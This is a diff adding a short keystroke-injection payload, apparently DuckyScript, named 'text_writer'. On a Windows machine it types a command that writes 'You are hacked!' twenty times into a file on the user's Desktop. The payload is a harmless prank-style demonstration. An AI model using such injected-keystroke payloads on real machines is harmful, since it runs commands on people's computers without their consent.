@@ -1,0 +1,4 @@
+REM Payload: text_writer
+DELAY 500
+STRING for /L %i in (1,1,20) do echo You are hacked! >> %USERPROFILE%\Desktop\warning.txt
+ENTER
